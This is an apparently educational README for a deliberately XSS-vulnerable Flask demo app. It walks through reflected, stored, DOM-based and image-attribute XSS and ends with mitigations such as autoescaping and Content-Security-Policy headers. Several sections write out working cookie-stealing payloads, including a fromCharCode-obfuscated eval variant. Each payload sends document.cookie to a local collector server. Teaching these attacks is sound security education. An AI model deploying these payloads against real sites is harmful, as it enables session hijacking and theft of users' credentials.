# XSS-Demo (Extended)
Minimal, flask-powered python web app to demonstrate reflected and stored XSS attacks.
Less than 30 lines of Python + 40 lines HTML template.

![XSS Demo Screenshot](xss-demo-screenshot.png "XSS Demo Screenshot")

# Disclaimer

The current version is vulnerable to XSS.
This is meant for educational purposed only, please do not use it to attack websites.

# Quickstart

* Clone this repository.
* Create a [virtual environment](https://virtualenvwrapper.readthedocs.io/) (if you don't want to install `flask` in your global python environment) and 
  activate it.
* `pip install flask` to install flask in the virtual environment
* Run `flask run` in the vulnerable website folder
* Open [127.0.0.1:5000](http://127.0.0.1:5000/) in your webbrowser and have fun with XSS

As you started the flask app in development mode, any source changes should apply immediately so you can just refresh
the page. If you want to clear the database, just delete the `database.db` file that is (re-)created on first use.


# How it works
## Conditions for this XSS payload to steal cookies from the user
* The [Content Security policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy) of the webpage must be misconfigured
  * [`httponly`](https://www.cookiepro.com/knowledge/httponly-cookie/) ensures that the cookies are not know by the javascript engine 
  * [`script-src`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src) must be incorrectly set
  * Redirection is not blocked.
* Autoescape must be off
  * There must be no autoescape at the side of the server.


# Demonstrations of XSS
## Things to note BEFORE trying the Demonstration
* Go to [127.0.0.1:5000/cookie](http://127.0.0.1:5000/cookie) to create set a cookie for the main website
* Run `python app.py` in the malicious website folder to run the malicious server to collect the cookies

To delete the cookie:
* Go to inspect element
* Go to Application Tab
* Click on cookies
* Right click on the entry that you want to delete

## Demonstration for reflected XSS
* Key in `<script type='text/javascript'>document.location='http://127.0.0.1:1000/?c='+document.cookie;</script>` into the query blank
* Notice that the code is reflected inside the addressbar as a query.
* When the user clicks on the link containing the address, their cookies from the vulnerable website can be stolen

## Demonstration for Stored XSS
### WARNING, this will spam ping the server as the page is loading
* Key in `<script type='text/javascript'>document.location='http://127.0.0.1:1000/?c='+document.cookie;</script>` into the comment blank
* Notice that the code is stored within the website
* When the user access the website, their cookies will automatically stolen until the comment is removed

As you started the flask app in development mode, any source changes should apply immediately so you can just refresh
the page. If you want to clear the database, just delete the `database.db` file that is (re-)created on first use.

## Demonstration for DOM-Based XSS
* Key in `http://localhost:5000/?num=alert(123)` into the address bar
* An alert for 123 will appear as an alert

In order to do something similar to the above, we cannot directly, insert `window.location=document.location='http://127.0.0.1:1000/?c='+document.cookie;` into the address bar after the query as some characters might be escaped. The javascript in the DOM only has access to the raw escaped query string and not the unescaped string. Thus, another method is required.

In this case the `toString().constructor.fromCharCode` will be our best friend
* Make sure both servers are up
* Key in `eval(toString().constructor.fromCharCode(119,105,110,100,111,119,46,108,111,99,97,116,105,111,110,61,100,111,99,117,109,101,110,116,46,108,111,99,97,116,105,111,110,61,39,104,116,116,112,58,47,47,49,50,55,46,48,46,48,46,49,58,49,48,48,48,47,63,99,61,39,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,59))` after the `num?` query.

What does it do?
* `toString().constructor.fromCharCode(...)` converts the character code for the javascript into a javascript string
* `eval` will evalucate the string. The string above corresponds to `document.location='http://127.0.0.1:1000/?c='+document.cookie;`
* The evaluator inside the DOM will evaluate the code as `document.location='http://127.0.0.1:1000/?c='+document.cookie;` and execute the reflected attack

You can make use of the XSSQueryFormer inside the folder to experiment around with the different javascript codes to be inserted as the payload

Usage:
* `python XSSQueryFormer.py "{Javascript Code here}"` to convert your code to javascript
* `python XSSQueryFormer.py -h` to show help message


# Different ways of executing XSS

## Execution of XSS through image loading
* Go to the images tab of the website
* Add ```' onerror="document.location='http://127.0.0.1:1000/?c='+document.cookie;"class=``` after the `#` symbol
* It will cause the xss script to execute and the cookie will be obtained by the malicious server

# Protection mechanisms

Of course you should never deactivate autoescaping in jinja/flask, so you should never have 
`{% autoescape false %}` in your production templates. 
<br>
This way you will always get the 
[standard HTML context filtering](https://flask.palletsprojects.com/en/1.1.x/templating/#controlling-autoescaping)
for variables in your templates.

The tooltip attack mentioned above can of course be avoided by using quotes correctly on 
[line 33 ](https://github.com/jh123x/xss-demo/blob/master/templates/index.html#L33):
```html
      <div title="{{ comment }}">
```

You can also test using 
[Content Security Policy headers](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy) to 
disallow unsafe inline javascript by replacing 
[`app.py` line 16-18](https://github.com/jh123x/xss-demo/blob/master/app.py#L16-L18) with:

```python
    from flask import make_response
    r = make_response(render_template('index.html',
                      comments=comments,
                      search_query=search_query))
    r.headers.set('Content-Security-Policy', "script-src 'none'")
    return r
```


# Acknowledgements
This was forked from [bgres/xss-demo](https://github.com/bgres/xss-demo) 